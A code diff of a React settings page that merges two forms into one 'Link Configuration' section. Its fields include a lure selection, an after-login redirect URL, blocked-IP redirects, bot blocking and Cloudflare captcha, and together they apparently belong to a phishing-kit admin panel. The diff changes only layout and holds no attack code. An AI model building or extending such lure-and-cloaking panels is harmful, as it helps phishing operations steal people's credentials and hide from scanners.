@@ -664,120 +664,17 @@ export default function Settings() {
         </section>
 
         <section className="bg-[#232A34] rounded-lg p-6">
-          <h2 className="text-white text-xl mb-4">Link Security Settings</h2>
-          <form onSubmit={handleSecuritySubmit} className="space-y-4">
-            <div>
-              <h3 className="text-gray-400 mb-3">Blacklist Settings</h3>
-              <div className="space-y-2">
-                <label className="flex items-center space-x-2">
-                  <input
-                    type="radio"
-                    data-allow-select="true"
-                    checked={settings.blockBots}
-                    onChange={() =>
-                      setSettings({ ...settings, blockBots: true })
-                    }
-                    className="text-indigo-500"
-                  />
-                  <span className="text-gray-400">
-                    Block All Bots And Crawlers
-                  </span>
-                </label>
-                <label className="flex items-center space-x-2">
-                  <input
-                    type="radio"
-                    data-allow-select="true"
-                    checked={!settings.blockBots}
-                    onChange={() =>
-                      setSettings({ ...settings, blockBots: false })
-                    }
-                    className="text-indigo-500"
-                  />
-                  <span className="text-gray-400">Do Not Block Bots</span>
-                </label>
-              </div>
-            </div>
-
-            <div>
-              <label className="block text-gray-400 mb-2">
-                Redirect URL for Blocked IPs
-              </label>
-              <input
-                type="text"
-                data-allow-select="true"
-                className="w-full bg-[#1B2028] text-white p-3 rounded"
-                value={settings.botRedirectLink}
-                onChange={(e) =>
-                  setSettings({ ...settings, botRedirectLink: e.target.value })
-                }
-                placeholder="https://example.com"
-              />
-            </div>
-
-            <button
-              type="submit"
-              disabled={saving}
-              className={`bg-indigo-500 text-white px-6 py-2 rounded ${
-                saving ? "opacity-50 cursor-not-allowed" : "hover:bg-indigo-600"
-              } transition-colors`}
-            >
-              {saving ? "Saving..." : "Save Changes"}
-            </button>
-          </form>
-        </section>
-
-        <section className="bg-[#232A34] rounded-lg p-6">
-          <h2 className="text-white text-xl mb-4">Link Settings</h2>
-          <form onSubmit={handleLinkSettingsSubmit} className="space-y-4">
-            <div>
-              <label className="block text-gray-400 mb-2">
-                After Login Redirect URL
-              </label>
-              <input
-                type="text"
-                data-allow-select="true"
-                className="w-full bg-[#1B2028] text-white p-3 rounded"
-                value={settings.afterLoginRedirect}
-                onChange={(e) =>
-                  setSettings({
-                    ...settings,
-                    afterLoginRedirect: e.target.value,
-                  })
-                }
-                placeholder="https://example.com"
-              />
-            </div>
-
-            <div>
-              <h3 className="text-gray-400 mb-3">Captcha Settings</h3>
-              <div className="space-y-2">
-                <label className="flex items-center space-x-2">
-                  <input
-                    type="radio"
-                    data-allow-select="true"
-                    checked={settings.useCaptcha}
-                    onChange={() =>
-                      setSettings({ ...settings, useCaptcha: true })
-                    }
-                    className="text-indigo-500"
-                  />
-                  <span className="text-gray-400">Use Cloudflare Captcha</span>
-                </label>
-                <label className="flex items-center space-x-2">
-                  <input
-                    type="radio"
-                    data-allow-select="true"
-                    checked={!settings.useCaptcha}
-                    onChange={() =>
-                      setSettings({ ...settings, useCaptcha: false })
-                    }
-                    className="text-indigo-500"
-                  />
-                  <span className="text-gray-400">Do Not Use Captcha</span>
-                </label>
-              </div>
-            </div>
-
+          <h2 className="text-white text-xl mb-4">Link Configuration</h2>
+          <form
+            onSubmit={(e) => {
+              e.preventDefault();
+              // Call both handlers with the same event
+              handleSecuritySubmit(e);
+              handleLinkSettingsSubmit(e);
+            }}
+            className="space-y-6"
+          >
+            {/* Link Path and Lure Selection */}
             <div>
               <label className="block text-gray-400 mb-2">Link Path</label>
               <input
@@ -804,6 +701,114 @@ export default function Settings() {
               )}
             </div>
 
+            {/* Redirect Settings */}
+            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+              <div>
+                <label className="block text-gray-400 mb-2">
+                  After Login Redirect URL
+                </label>
+                <input
+                  type="text"
+                  data-allow-select="true"
+                  className="w-full bg-[#1B2028] text-white p-3 rounded"
+                  value={settings.afterLoginRedirect}
+                  onChange={(e) =>
+                    setSettings({
+                      ...settings,
+                      afterLoginRedirect: e.target.value,
+                    })
+                  }
+                  placeholder="https://example.com"
+                />
+              </div>
+
+              <div>
+                <label className="block text-gray-400 mb-2">
+                  Redirect URL for Blocked IPs
+                </label>
+                <input
+                  type="text"
+                  data-allow-select="true"
+                  className="w-full bg-[#1B2028] text-white p-3 rounded"
+                  value={settings.botRedirectLink}
+                  onChange={(e) =>
+                    setSettings({
+                      ...settings,
+                      botRedirectLink: e.target.value,
+                    })
+                  }
+                  placeholder="https://example.com"
+                />
+              </div>
+            </div>
+
+            {/* Security and Captcha Settings */}
+            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+              <div>
+                <h3 className="text-gray-400 mb-3">Bot Protection</h3>
+                <div className="space-y-2">
+                  <label className="flex items-center space-x-2">
+                    <input
+                      type="radio"
+                      data-allow-select="true"
+                      checked={settings.blockBots}
+                      onChange={() =>
+                        setSettings({ ...settings, blockBots: true })
+                      }
+                      className="text-indigo-500"
+                    />
+                    <span className="text-gray-400">
+                      Block All Bots And Crawlers
+                    </span>
+                  </label>
+                  <label className="flex items-center space-x-2">
+                    <input
+                      type="radio"
+                      data-allow-select="true"
+                      checked={!settings.blockBots}
+                      onChange={() =>
+                        setSettings({ ...settings, blockBots: false })
+                      }
+                      className="text-indigo-500"
+                    />
+                    <span className="text-gray-400">Do Not Block Bots</span>
+                  </label>
+                </div>
+              </div>
+
+              <div>
+                <h3 className="text-gray-400 mb-3">Captcha Settings</h3>
+                <div className="space-y-2">
+                  <label className="flex items-center space-x-2">
+                    <input
+                      type="radio"
+                      data-allow-select="true"
+                      checked={settings.useCaptcha}
+                      onChange={() =>
+                        setSettings({ ...settings, useCaptcha: true })
+                      }
+                      className="text-indigo-500"
+                    />
+                    <span className="text-gray-400">
+                      Use Cloudflare Captcha
+                    </span>
+                  </label>
+                  <label className="flex items-center space-x-2">
+                    <input
+                      type="radio"
+                      data-allow-select="true"
+                      checked={!settings.useCaptcha}
+                      onChange={() =>
+                        setSettings({ ...settings, useCaptcha: false })
+                      }
+                      className="text-indigo-500"
+                    />
+                    <span className="text-gray-400">Do Not Use Captcha</span>
+                  </label>
+                </div>
+              </div>
+            </div>
+
             <button
               type="submit"
               disabled={saving}
@@ -811,7 +816,7 @@ export default function Settings() {
                 saving ? "opacity-50 cursor-not-allowed" : "hover:bg-indigo-600"
               } transition-colors`}
             >
-              {saving ? "Saving..." : "Save Changes"}
+              {saving ? "Saving..." : "Save Link Configuration"}
             </button>
           </form>
         </section>
